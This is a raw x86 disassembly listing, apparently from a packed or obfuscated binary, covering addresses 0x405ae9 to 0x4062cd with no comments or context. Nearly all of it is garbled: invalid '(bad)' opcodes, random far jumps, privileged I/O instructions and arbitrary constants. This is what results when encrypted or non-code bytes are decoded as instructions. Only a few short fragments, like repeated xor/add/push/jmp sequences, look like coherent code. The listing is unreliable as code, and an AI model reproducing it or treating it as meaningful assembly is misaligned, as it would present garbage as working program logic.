  405ae9:	mov    al,0x14
  405aeb:	or     BYTE PTR es:[edi+0x60],0x3f
  405af0:	add    DWORD PTR ds:0xa8a95642,esi
  405af6:	inc    esi
  405af7:	xchg   edx,eax
  405af8:	mov    ecx,0xa422b8ef
  405afd:	jecxz  0x405b71
  405aff:	aam    0x2b
  405b01:	test   al,0xfb
  405b03:	mov    dl,0xfc
  405b05:	ins    DWORD PTR es:[edi],dx
  405b06:	aas    
  405b07:	inc    esp
  405b08:	and    ah,BYTE PTR [ecx+0x3e]
  405b0b:	arpl   WORD PTR [edi+0x58],dx
  405b0e:	and    eax,0x4d2bb02d
  405b13:	ds mov esp,0x188cb2b3
  405b19:	dec    eax
  405b1a:	ins    BYTE PTR es:[edi],dx
  405b1b:	xor    BYTE PTR [eax-0x4ac0d948],0xbc
  405b22:	pusha  
  405b23:	lods   al,BYTE PTR ds:[esi]
  405b24:	ret    
  405b25:	pop    ecx
  405b26:	ds retf 0x672e
  405b2a:	ror    DWORD PTR [esi],0x18
  405b2d:	(bad)  
  405b2e:	fld    DWORD PTR [ebp+0x61babf23]
  405b34:	(bad)  
  405b35:	dec    ebp
  405b36:	push   eax
  405b37:	mov    bl,bl
  405b39:	pop    ecx
  405b3a:	ds pusha 
  405b3c:	(bad)  
  405b3d:	(bad)  
  405b3e:	mov    edi,0x768b3980
  405b43:	loop   0x405b2c
  405b45:	fs jne 0x405ac8
  405b48:	shl    esp,0x96
  405b4b:	and    dh,BYTE PTR [eax+0x6c]
  405b4e:	mov    ds:0x53d4e7be,al
  405b53:	pop    esp
  405b54:	pop    ebp
  405b55:	add    DWORD PTR [esi],ebx
  405b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b58:	pop    es
  405b59:	mov    DWORD PTR [edi-0x1],eax
  405b5c:	call   0xe72574f6
  405b61:	leave  
  405b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b63:	push   es
  405b64:	sub    eax,0x299a0f71
  405b69:	push   0xffffffee
  405b6b:	dec    esi
  405b6c:	scas   eax,DWORD PTR es:[edi]
  405b6d:	test   BYTE PTR [ebp+0x73ebe40c],ch
  405b73:	std    
  405b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b75:	fdiv   QWORD PTR [edi]
  405b77:	mov    ds:0x37fc4bec,eax
  405b7c:	xchg   esi,eax
  405b7d:	or     BYTE PTR [ecx],dh
  405b7f:	or     BYTE PTR [ecx-0x4566926e],0xce
  405b86:	dec    esi
  405b87:	fld    st(0)
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	push   ecx
  405bac:	ror    DWORD PTR [ebp-0x17],0x60
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b7f
  405bb8:	sub    cl,bh
  405bba:	adc    edi,esi
  405bbc:	ja     0x405bb3
  405bbe:	xchg   ecx,eax
  405bbf:	jns    0x405b4c
  405bc1:	or     eax,DWORD PTR [edx]
  405bc3:	xchg   esi,eax
  405bc4:	sbb    DWORD PTR [ebx-0x7c6102f0],edi
  405bca:	add    edi,DWORD PTR ds:0xe437dc22
  405bd0:	mov    WORD PTR [ebp+0x55],fs
  405bd3:	and    cl,BYTE PTR [edi-0x2a]
  405bd6:	sbb    eax,0xef07e032
  405bdb:	cmp    BYTE PTR ds:0x52809934,ah
  405be1:	sbb    ebp,DWORD PTR [esi-0x4efb223a]
  405be7:	mov    ds:0x653ffc7f,al
  405bec:	mov    DWORD PTR [edx+0xca374e8],esi
  405bf2:	xor    ebp,DWORD PTR [edi+0x6e3d264]
  405bf8:	pop    ebx
  405bf9:	rcl    DWORD PTR [esi-0x67b83e52],1
  405bff:	pop    ecx
  405c00:	ret    
  405c01:	jle    0x405c0c
  405c03:	cmp    al,0x31
  405c05:	xchg   esp,eax
  405c06:	shr    DWORD PTR [eax-0x9114035],1
  405c0c:	pusha  
  405c0d:	push   esi
  405c0e:	push   esp
  405c0f:	add    al,0xca
  405c11:	sub    esp,DWORD PTR [esi]
  405c13:	or     eax,0x91a24e43
  405c18:	cmp    ebp,edi
  405c1a:	shl    DWORD PTR [edx-0x3a],cl
  405c1d:	aam    0x2f
  405c1f:	cs xchg ebp,eax
  405c21:	call   0xa87e:0x18c656aa
  405c28:	ret    0xc404
  405c2b:	ret    
  405c2c:	sahf   
  405c2d:	lahf   
  405c2e:	xchg   edx,eax
  405c2f:	sbb    eax,0x8892f6ab
  405c34:	icebp  
  405c35:	loop   0x405caa
  405c37:	or     al,0x5e
  405c39:	adc    ecx,DWORD PTR [eax+0x4c7ba637]
  405c3f:	jge    0x405be0
  405c41:	sbb    bl,cl
  405c43:	imul   edx,ebx,0xffffff8c
  405c46:	dec    ebx
  405c47:	shl    BYTE PTR [esi],0xde
  405c4a:	(bad)  
  405c4b:	pop    es
  405c4c:	std    
  405c4d:	(bad)  
  405c4e:	pop    ebx
  405c4f:	cld    
  405c50:	jne    0x405be8
  405c52:	je     0x405cd1
  405c54:	and    ebx,ebp
  405c56:	in     eax,0xc
  405c58:	dec    ebx
  405c59:	xchg   edi,eax
  405c5a:	xor    al,0xce
  405c5c:	(bad)  [ecx]
  405c5e:	cs cmc 
  405c60:	dec    ebx
  405c61:	xor    al,0x13
  405c63:	mov    ebp,0xc7b1fc91
  405c68:	cmc    
  405c69:	and    al,BYTE PTR [eax]
  405c6b:	ds hlt 
  405c6d:	js     0x405bfb
  405c6f:	push   edx
  405c70:	cmp    dh,BYTE PTR [ecx]
  405c72:	xor    al,0xb1
  405c74:	xor    al,BYTE PTR [esi-0x2199eb72]
  405c7a:	js     0x405cbc
  405c7c:	xor    DWORD PTR [ebx+0x60],0x6b
  405c80:	dec    esi
  405c81:	fidiv  DWORD PTR [ebp-0x1574bbcd]
  405c87:	cs inc ecx
  405c89:	xchg   BYTE PTR [ecx+ebp*8+0x3880eb14],dl
  405c90:	mov    BYTE PTR [esi-0x2a],ch
  405c93:	jne    0x405c80
  405c95:	xchg   esi,eax
  405c96:	mov    ebx,0x6c8cbc06
  405c9b:	mov    esp,0xfd522c6a
  405ca0:	xchg   esp,eax
  405ca1:	sub    ecx,ebx
  405ca3:	mov    BYTE PTR [esi],0x6e
  405ca6:	enter  0x476,0x58
  405caa:	js     0x405cd5
  405cac:	fld    DWORD PTR [ebx-0x554bf588]
  405cb2:	jmp    0xbe91:0x4c0b99d2
  405cb9:	jo     0x405c6b
  405cbb:	adc    BYTE PTR [esi+ebp*4+0x2169e8db],ah
  405cc2:	test   al,0x8
  405cc4:	pusha  
  405cc5:	arpl   WORD PTR [ebp+edx*1+0x5],dx
  405cc9:	popf   
  405cca:	xor    al,0xe1
  405ccc:	dec    ebx
  405ccd:	xchg   ebp,eax
  405cce:	mov    ds:0x9c34daa7,eax
  405cd3:	(bad)  
  405cd4:	bound  edx,QWORD PTR [esi+ecx*2-0x6d]
  405cd8:	xor    al,0xe2
  405cda:	sar    bl,0x1d
  405cdd:	out    0x58,eax
  405cdf:	cmc    
  405ce0:	push   ds
  405ce1:	jbe    0x405d5a
  405ce3:	mov    bh,0xc6
  405ce5:	popf   
  405ce6:	dec    ebp
  405ce7:	cmc    
  405ce8:	in     al,0xf7
  405cea:	xchg   esp,eax
  405ceb:	pop    ecx
  405cec:	xchg   edx,eax
  405ced:	dec    edx
  405cee:	sub    BYTE PTR [edi],0x25
  405cf1:	pop    eax
  405cf2:	xchg   ebx,eax
  405cf3:	scas   al,BYTE PTR es:[edi]
  405cf4:	cmp    eax,0xfc95ae1f
  405cf9:	xchg   esi,eax
  405cfa:	aam    0x74
  405cfc:	inc    eax
  405cfd:	sbb    al,0x68
  405cff:	and    edx,DWORD PTR [eax-0x234546bb]
  405d05:	fldenv [edi]
  405d07:	jg     0x405d60
  405d09:	jp     0x405ccf
  405d0b:	and    BYTE PTR [eax+0x73],dh
  405d0e:	mov    DWORD PTR [edi-0x230180db],0xb927066f
  405d18:	cmp    al,0xdc
  405d1a:	jp     0x405d09
  405d1c:	mov    ecx,DWORD PTR [esi]
  405d1e:	mov    dh,0x5f
  405d20:	push   esp
  405d21:	aad    0x44
  405d23:	ins    DWORD PTR es:[edi],dx
  405d24:	jl     0x405d5a
  405d26:	cli    
  405d27:	or     dl,BYTE PTR [esi-0x47]
  405d2a:	cmp    DWORD PTR [esi-0x51],ecx
  405d2d:	xor    BYTE PTR [ebx-0x1667ef0f],bl
  405d33:	in     al,0x96
  405d35:	retf   0xfcc
  405d38:	outs   dx,BYTE PTR ds:[esi]
  405d39:	jo     0x405d09
  405d3b:	push   0x15158d16
  405d40:	inc    eax
  405d41:	ret    0x33a9
  405d44:	out    0xfa,eax
  405d46:	mov    ebx,0xc94a5a73
  405d4b:	sub    DWORD PTR [edx-0x60c6df1f],ebp
  405d51:	sahf   
  405d52:	mov    dh,0x5a
  405d54:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  405d56:	pop    ebp
  405d57:	sub    al,0xa1
  405d59:	fadd   DWORD PTR [esp+ebx*8-0x78]
  405d5d:	(bad)  
  405d5e:	mov    al,0x9e
  405d60:	jb     0x405d74
  405d62:	ret    
  405d63:	add    al,0xbb
  405d65:	push   0x84f40715
  405d6a:	aam    0x10
  405d6c:	jl     0x405cf6
  405d6e:	mov    esp,0xd6dbdbf8
  405d73:	mov    edx,0x4e8d936d
  405d78:	mov    BYTE PTR [ebx],bl
  405d7a:	adc    bl,dl
  405d7c:	add    BYTE PTR [edx-0x64],bh
  405d7f:	push   ss
  405d80:	ror    BYTE PTR [esi+0x53],1
  405d83:	push   esi
  405d84:	cmp    DWORD PTR [eax],eax
  405d86:	lahf   
  405d87:	idiv   ch
  405d89:	mov    dl,BYTE PTR [esi+0x6a]
  405d8c:	mov    esp,0xdb6bb84
  405d91:	adc    eax,0x8bf0458b
  405d96:	sbb    BYTE PTR [eax-0xffffff],0x30
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0xbe9c135b,al
  405dbe:	jns    0x405da7
  405dc0:	or     eax,DWORD PTR [edi+0x37]
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e3c
  405dca:	dec    edi
  405dcb:	sub    ecx,DWORD PTR [edi+0x7]
  405dce:	xchg   esp,eax
  405dcf:	mov    cl,0x81
  405dd1:	aas    
  405dd2:	cs sub eax,0x562d9061
  405dd8:	adc    DWORD PTR [esi-0x66],esp
  405ddb:	sub    DWORD PTR [eax-0xdc81ae0],0xba18ffdd
  405de5:	sub    bh,bh
  405de7:	dec    eax
  405de8:	inc    ebp
  405de9:	ins    BYTE PTR es:[edi],dx
  405dea:	mov    edi,0xd1aa881b
  405def:	sbb    BYTE PTR [ecx+0x18],0x2f
  405df3:	enter  0x40d3,0x91
  405df7:	cmp    DWORD PTR [ebx-0x32],ecx
  405dfa:	xor    esi,edi
  405dfc:	xchg   esi,eax
  405dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dfe:	sbb    ebx,ebp
  405e00:	xchg   esp,eax
  405e01:	pop    es
  405e02:	hlt    
  405e03:	pop    es
  405e04:	std    
  405e05:	aad    0x7c
  405e07:	dec    ecx
  405e08:	repz lock jae 0x405e50
  405e0c:	out    dx,al
  405e0d:	js     0x405df7
  405e0f:	jle    0x405e3b
  405e11:	imul   esp,eax,0xdccfc1e1
  405e17:	fmulp  st(5),st
  405e19:	xcrypt-ofb 
  405e1c:	xchg   edi,eax
  405e1d:	dec    ebx
  405e1e:	cwde   
  405e1f:	or     DWORD PTR [ecx+0x29],ebp
  405e22:	xchg   BYTE PTR [edx+0x33],dh
  405e25:	shr    DWORD PTR [eax+0x39],1
  405e28:	test   edi,edx
  405e2a:	rol    BYTE PTR [edi-0x36],0x94
  405e2e:	push   ss
  405e2f:	clc    
  405e30:	(bad)  
  405e31:	jo     0x405e48
  405e33:	out    0x3e,al
  405e35:	sub    ebp,esi
  405e37:	(bad)  
  405e38:	adc    eax,0x2681861a
  405e3d:	rol    ch,cl
  405e3f:	call   0x9c1df782
  405e44:	push   0x24
  405e46:	dec    esp
  405e47:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e49:	call   0x7688fccd
  405e4e:	cmp    al,0x6b
  405e50:	adc    eax,0xe1ef8fcf
  405e55:	int    0xc8
  405e57:	mov    ch,0x6c
  405e59:	mov    ebp,es
  405e5b:	cmp    DWORD PTR [esp+ebx*2],0x13
  405e5f:	fwait
  405e60:	in     al,0xed
  405e62:	fs mov dl,0xd4
  405e65:	lods   al,BYTE PTR ds:[esi]
  405e66:	sub    al,0x23
  405e68:	mov    cl,0x98
  405e6a:	mov    dl,BYTE PTR [eax+esi*8-0x5b0a4918]
  405e71:	and    ch,cl
  405e73:	dec    ecx
  405e74:	cdq    
  405e75:	or     cl,dh
  405e77:	idiv   DWORD PTR [eax]
  405e79:	sub    bh,dl
  405e7b:	sub    DWORD PTR [ebx],esi
  405e7d:	ret    0xd807
  405e80:	sub    dh,dh
  405e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e83:	mov    ecx,0x3d237729
  405e88:	adc    ecx,ebx
  405e8a:	shr    edi,1
  405e8c:	retf   
  405e8d:	test   dl,bh
  405e8f:	addr16 (bad) 
  405e91:	idiv   ah
  405e93:	inc    ebx
  405e94:	sti    
  405e95:	js     0x405e7e
  405e97:	mov    ds,WORD PTR [ebp-0xd]
  405e9a:	adc    esi,DWORD PTR [eax+0x5b499a55]
  405ea0:	pop    ebp
  405ea1:	mov    cl,0x89
  405ea3:	aad    0xca
  405ea5:	sub    DWORD PTR [edi+ebp*1+0x1d],0xce87b30f
  405ead:	rcl    BYTE PTR fs:[esi+eax*8-0x68e38002],1
  405eb5:	sub    bh,ch
  405eb7:	lods   eax,DWORD PTR ds:[esi]
  405eb8:	repnz imul edx,esi,0xffffffd5
  405ebc:	pop    edi
  405ebd:	sbb    ch,BYTE PTR [eax+0x2b]
  405ec0:	scas   al,BYTE PTR es:[edi]
  405ec1:	mov    al,0xf8
  405ec3:	pop    ss
  405ec4:	pusha  
  405ec5:	retf   0xf3a3
  405ec8:	push   esi
  405ec9:	icebp  
  405eca:	xchg   BYTE PTR [ebp-0x1c],bh
  405ecd:	or     eax,0x63438739
  405ed2:	test   eax,0xb834378a
  405ed7:	imul   edx,ebx,0xffffff81
  405eda:	and    BYTE PTR [edi+edx*8-0x1e],ch
  405ede:	push   ss
  405edf:	dec    ebp
  405ee0:	outs   dx,DWORD PTR ds:[esi]
  405ee1:	pusha  
  405ee2:	test   DWORD PTR [edi+0x47],ebp
  405ee5:	or     ch,al
  405ee7:	dec    esi
  405ee8:	xchg   DWORD PTR [ebp+0x4b890ccc],ebp
  405eee:	inc    esi
  405eef:	jmp    0xd93:0xd669d44b
  405ef6:	and    eax,0x2def9c6e
  405efb:	test   DWORD PTR [ecx+esi*8+0x43a9eacb],0x8d552bcc
  405f06:	mov    esp,?
  405f08:	gs call 0xfcbc:0x1773acd8
  405f10:	or     eax,0x31a4dbe3
  405f15:	repnz (bad) 
  405f17:	adc    al,BYTE PTR [ebx+edx*1+0x1d]
  405f1b:	mov    ch,0x99
  405f1d:	pushf  
  405f1e:	leave  
  405f1f:	adc    al,0xca
  405f21:	jnp    0x405ec7
  405f23:	sbb    eax,0x5a2010c6
  405f28:	cdq    
  405f29:	xchg   esp,eax
  405f2a:	add    cl,BYTE PTR [ecx]
  405f2c:	jge    0x405f49
  405f2e:	sub    dh,BYTE PTR [ebx+0x26]
  405f31:	js     0x405ef7
  405f33:	call   0xb8a:0x28bfebf
  405f3a:	aad    0x85
  405f3c:	add    ebx,DWORD PTR [edi-0x24]
  405f3f:	adc    DWORD PTR [edx+edx*2-0x47],eax
  405f43:	ds test al,0xe3
  405f46:	lea    ebp,[edx-0x63d2aec0]
  405f4c:	sbb    DWORD PTR ds:0x5c41b127,esi
  405f52:	mov    esi,0x3116cd6f
  405f57:	add    eax,0xd45142cd
  405f5c:	clc    
  405f5d:	mov    dh,0xb7
  405f5f:	push   esi
  405f60:	pop    ebp
  405f61:	dec    ecx
  405f62:	mov    esi,0x1c904e3e
  405f67:	retf   0x1cc3
  405f6a:	lds    ebp,FWORD PTR [esi+0x7743caf7]
  405f70:	xrelease mov BYTE PTR [edi-0x6c],ch
  405f74:	and    bh,BYTE PTR [ecx-0x3c4d6792]
  405f7a:	jo     0x405f24
  405f7c:	sbb    ecx,0xffffff84
  405f7f:	iret   
  405f80:	pop    edi
  405f81:	add    DWORD PTR [eax-0x39],esp
  405f84:	xchg   edi,eax
  405f85:	je     0x405fbf
  405f87:	mov    ds:0x19559a5f,al
  405f8c:	shl    DWORD PTR [ebx+0x47708e5e],1
  405f92:	and    esp,DWORD PTR [esi+0x21ccb43f]
  405f98:	pop    esi
  405f99:	cdq    
  405f9a:	jo     0x405f1e
  405f9c:	mov    al,ds:0x459ed320
  405fa1:	pop    edi
  405fa2:	aas    
  405fa3:	jne    0x405f2e
  405fa5:	inc    ebp
  405fa6:	loopne 0x405fb7
  405fa8:	test   BYTE PTR [esi-0x16fffff6],dl
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x5d]
  405fbf:	ss hlt 
  405fc1:	jmp    0x7ebe9560
  405fc6:	push   ebp
  405fc7:	jg     0x406047
  405fc9:	jle    0x405fb1
  405fcb:	and    al,0xde
  405fcd:	adc    DWORD PTR [ebx+ebx*8+0x87e2b7],eax
  405fd4:	(bad)  
  405fd5:	out    0x58,eax
  405fd7:	push   ebp
  405fd8:	xchg   esp,eax
  405fd9:	push   0xffffffbe
  405fdb:	jo     0x405fb5
  405fdd:	jecxz  0x40602f
  405fdf:	xchg   edx,eax
  405fe0:	enter  0x4289,0x32
  405fe4:	popa   
  405fe5:	or     DWORD PTR [edi+edx*1-0x68daf1fe],ecx
  405fec:	inc    ecx
  405fed:	ja     0x405fda
  405fef:	popa   
  405ff0:	mov    ebx,0x7a728a72
  405ff5:	or     dl,BYTE PTR [esi+0x75]
  405ff8:	data16 jo 0x40606f
  405ffb:	xchg   esp,eax
  405ffc:	and    ebx,esi
  405ffe:	rol    DWORD PTR [ebp-0x12354cbe],cl
  406004:	inc    edx
  406005:	gs add bh,0x7b
  406009:	or     al,0xfa
  40600b:	lds    edi,FWORD PTR [ecx-0x5038b506]
  406011:	cld    
  406012:	(bad)  
  406013:	in     eax,0x18
  406015:	cmp    BYTE PTR [edx+edx*1],0xf1
  406019:	test   al,0xcf
  40601b:	inc    edx
  40601c:	ror    DWORD PTR [eax-0x29],cl
  40601f:	push   ebp
  406020:	shr    DWORD PTR [ebp-0x53736c8a],0x75
  406027:	dec    eax
  406028:	push   0xffffffae
  40602a:	scas   al,BYTE PTR es:[edi]
  40602b:	aas    
  40602c:	ret    0x5694
  40602f:	fimul  DWORD PTR [edi-0x62]
  406032:	in     eax,0xd8
  406034:	mov    ebp,0x18327f0e
  406039:	mov    edi,ds
  40603b:	jo     0x406066
  40603d:	add    dl,al
  40603f:	fsub   DWORD PTR [bp+si+0x1745]
  406044:	std    
  406045:	(bad)  
  406047:	stc    
  406048:	pusha  
  406049:	add    eax,esp
  40604b:	loop   0x406032
  40604d:	jne    0x4060c7
  40604f:	xchg   esi,eax
  406050:	jne    0x40600d
  406052:	sbb    al,0x49
  406054:	cmp    ebp,DWORD PTR [esi]
  406056:	and    BYTE PTR [edi-0x30c69138],0x8d
  40605d:	push   ebx
  40605e:	dec    edi
  40605f:	pop    ss
  406060:	int    0x41
  406062:	mov    al,ds:0xbfc02275
  406067:	lods   eax,DWORD PTR ds:[esi]
  406068:	push   esp
  406069:	inc    edi
  40606a:	xchg   ebp,eax
  40606b:	(bad)  
  40606c:	jmp    0x5ea22a26
  406071:	cmp    dh,BYTE PTR [eax-0x73c4cf6d]
  406077:	mov    edi,DWORD PTR [edx+eax*1+0x2bcc7066]
  40607e:	sbb    BYTE PTR [ebx+0x6cc3ecb5],0x68
  406085:	jae    0x4060f1
  406087:	pop    ebx
  406088:	es (bad) 
  40608a:	stc    
  40608b:	inc    edx
  40608c:	out    dx,eax
  40608d:	pop    edi
  40608e:	add    DWORD PTR fs:[edi-0x42a7e6],eax
  406095:	push   0x72
  406097:	fbld   TBYTE PTR [ebx-0x3dea3ac7]
  40609d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40609f:	outs   dx,DWORD PTR es:[esi]
  4060a1:	dec    ebx
  4060a2:	xchg   esp,eax
  4060a3:	(bad)  
  4060a4:	cmp    bl,al
  4060a6:	mov    cl,0xdb
  4060a8:	aam    0x4e
  4060aa:	pop    esp
  4060ab:	sar    DWORD PTR [eax],1
  4060ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ae:	test   DWORD PTR [esi],0xe51a2003
  4060b4:	mov    eax,0x5b5c9d57
  4060b9:	int3   
  4060ba:	mov    eax,ds:0xa749437f
  4060bf:	jg     0x406120
  4060c1:	xchg   BYTE PTR [eax],cl
  4060c3:	mov    eax,0xe6850a27
  4060c8:	mov    ds:0xc53361d,eax
  4060cd:	sbb    edx,DWORD PTR [edi+ebp*1]
  4060d0:	pop    ebx
  4060d1:	push   ebx
  4060d2:	push   edx
  4060d3:	xor    BYTE PTR [edi-0x48144a6c],bl
  4060d9:	clc    
  4060da:	je     0x406066
  4060dc:	out    dx,al
  4060dd:	mov    al,0x22
  4060df:	jmp    0x251b:0x2e875f3
  4060e6:	stos   DWORD PTR es:[edi],eax
  4060e7:	mov    edx,0xf9114036
  4060ec:	dec    esp
  4060ed:	jo     0x4060d7
  4060ef:	xchg   DWORD PTR [ebx],ebp
  4060f1:	mov    al,ds:0x2e6c6070
  4060f6:	ins    DWORD PTR es:[edi],dx
  4060f7:	imul   edi,DWORD PTR [ebp+0x69a544e9],0xffffffaa
  4060fe:	push   es
  4060ff:	scas   eax,DWORD PTR es:[edi]
  406100:	pop    esi
  406101:	cmp    al,0x60
  406103:	push   eax
  406104:	stc    
  406105:	aas    
  406106:	jo     0x40616a
  406108:	xor    BYTE PTR [ebx-0x2],ah
  40610b:	loopne 0x406177
  40610d:	hlt    
  40610e:	mov    cs,esi
  406110:	jo     0x406146
  406112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406113:	cmp    eax,0x2b99826
  406118:	add    eax,0xb54d450
  40611d:	adc    esp,esp
  40611f:	xlat   BYTE PTR ds:[ebx]
  406120:	mov    esi,0x9e985799
  406125:	push   esp
  406126:	cwde   
  406127:	nop
  406128:	leave  
  406129:	fdivr  QWORD PTR [edx-0x17185b30]
  40612f:	mov    ecx,0x644d1d16
  406134:	inc    edi
  406135:	loope  0x4061a4
  406137:	aam    0x2f
  406139:	or     al,0x0
  40613b:	js     0x4060e5
  40613d:	and    eax,0xedce35d4
  406142:	aas    
  406143:	jmp    0x19cb:0xb409778
  40614a:	sti    
  40614b:	mov    ds:0x4f9ecacb,ax
  406151:	cwde   
  406152:	dec    edx
  406153:	or     ecx,DWORD PTR [esi]
  406155:	data16 cmp BYTE PTR [esi+eax*2+0x74],al
  40615a:	sbb    bh,BYTE PTR [eax-0x74]
  40615d:	ins    BYTE PTR es:[edi],dx
  40615e:	in     al,0xf4
  406160:	arpl   ax,dx
  406162:	or     al,0x59
  406164:	jnp    0x4060ea
  406166:	pop    edi
  406167:	jne    0x4061cf
  406169:	push   cs
  40616a:	mov    WORD PTR [ebp+esi*8+0x37],gs
  40616e:	rcr    esi,cl
  406170:	les    ebx,FWORD PTR [esi-0x4c]
  406173:	aam    0x64
  406175:	dec    ebp
  406176:	dec    ebx
  406177:	mov    eax,ds:0x4b237b66
  40617c:	or     BYTE PTR [edi],bl
  40617e:	pop    ecx
  40617f:	stc    
  406180:	test   DWORD PTR [esi-0x58],0xff9ffb42
  406187:	rol    BYTE PTR [ecx+edx*1-0x7254a277],0xb1
  40618f:	sbb    eax,edx
  406191:	sahf   
  406192:	retf   
  406193:	inc    ecx
  406194:	loope  0x406124
  406196:	adc    DWORD PTR [eax+0x3d7e42cf],0x79
  40619d:	lock xchg ebx,eax
  40619f:	cwde   
  4061a0:	(bad)  
  4061a1:	cmc    
  4061a2:	bound  edx,QWORD PTR [edi-0x17ba7291]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	aas    
  4061d2:	sbb    edx,DWORD PTR [ebp+0x7e33f179]
  4061d8:	jle    0x40622f
  4061da:	jg     0x40625a
  4061dc:	jle    0x406235
  4061de:	mov    eax,ds:0x9d61de29
  4061e3:	jne    0x406213
  4061e5:	iret   
  4061e6:	or     DWORD PTR [ecx+0x3e],esp
  4061e9:	push   ecx
  4061ea:	jne    0x406177
  4061ec:	outs   dx,BYTE PTR ds:[esi]
  4061ed:	add    BYTE PTR [eax-0x78b33499],bl
  4061f3:	cdq    
  4061f4:	push   edx
  4061f5:	or     esi,edx
  4061f7:	inc    ecx
  4061f8:	loopne 0x4061b8
  4061fa:	and    bl,BYTE PTR [ebx]
  4061fc:	stos   BYTE PTR es:[edi],al
  4061fd:	(bad)  
  4061fe:	pop    eax
  4061ff:	xor    eax,DWORD PTR [edi-0x3eee11b]
  406205:	fwait
  406206:	into   
  406207:	mov    eax,ds:0x8d9e8f90
  40620c:	mov    ch,0x55
  40620e:	cmp    ch,bl
  406210:	in     eax,dx
  406211:	cs in  al,0x5a
  406214:	icebp  
  406215:	arpl   WORD PTR [edi-0xc],sp
  406218:	test   DWORD PTR ds:0x20a6630f,0xd58a8114
  406222:	jnp    0x4061e0
  406224:	aam    0x68
  406226:	jecxz  0x40627c
  406228:	fistp  DWORD PTR [eax]
  40622a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40622b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40622c:	fcomp  DWORD PTR [ebx-0xe]
  40622f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406230:	scas   eax,DWORD PTR es:[edi]
  406231:	sub    al,al
  406233:	sbb    ecx,ebx
  406235:	xor    ch,ch
  406237:	and    al,0xcd
  406239:	jp     0x406202
  40623b:	(bad)  
  40623c:	bound  eax,QWORD PTR [edi]
  40623e:	xlat   BYTE PTR ds:[ebx]
  40623f:	or     DWORD PTR ss:[edi-0x55064806],esp
  406246:	clc    
  406247:	and    al,BYTE PTR ds:0x66c4b74d
  40624d:	mov    ebp,0x68acd9d8
  406252:	xor    eax,0xb58ef51b
  406257:	rol    BYTE PTR [eax-0x7d432f30],cl
  40625d:	in     al,dx
  40625e:	test   BYTE PTR [ebp+0x2c],dh
  406261:	mov    al,ds:0xe82abd94
  406266:	xor    eax,0x91c47ce2
  40626b:	lea    edi,[edi]
  40626d:	(bad)  
  40626e:	and    ebx,DWORD PTR [esi]
  406270:	loopne 0x40627a
  406272:	ficom  WORD PTR [edx-0x2c65b46b]
  406278:	jne    0x406240
  40627a:	mov    esi,0x61250cb
  40627f:	fild   DWORD PTR [ebx-0x67]
  406282:	xor    eax,0x172d94a8
  406287:	xor    ch,al
  406289:	ret    0xbf61
  40628c:	ins    BYTE PTR es:[edi],dx
  40628d:	ds mov al,0xd4
  406290:	hlt    
  406291:	pop    es
  406292:	aas    
  406293:	rcl    DWORD PTR [esi+0x1b],cl
  406296:	out    dx,eax
  406297:	cmp    ah,dl
  406299:	sbb    ebx,DWORD PTR [ecx+0x11]
  40629c:	inc    esp
  40629d:	ret    0xe462
  4062a0:	neg    DWORD PTR ds:0x55b103c8
  4062a6:	pop    edx
  4062a7:	jg     0x406327
  4062a9:	pop    ebp
  4062aa:	dec    eax
  4062ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ac:	sbb    dh,BYTE PTR [ebp+0x3697d1f9]
  4062b2:	dec    esi
  4062b3:	add    al,0x49
  4062b5:	xor    al,BYTE PTR [ecx]
  4062b7:	push   ebp
  4062b8:	sbb    DWORD PTR [ecx],ebp
  4062ba:	or     eax,0xef1cba70
  4062bf:	in     eax,dx
  4062c0:	inc    edx
  4062c1:	mov    ebp,edi
  4062c3:	sub    ecx,0xffffffdf
  4062c6:	jae    0x406326
  4062c8:	pop    ebx
  4062c9:	ret    0x33d4
  4062cc:	daa    
  4062cd:	jp     0x40628e
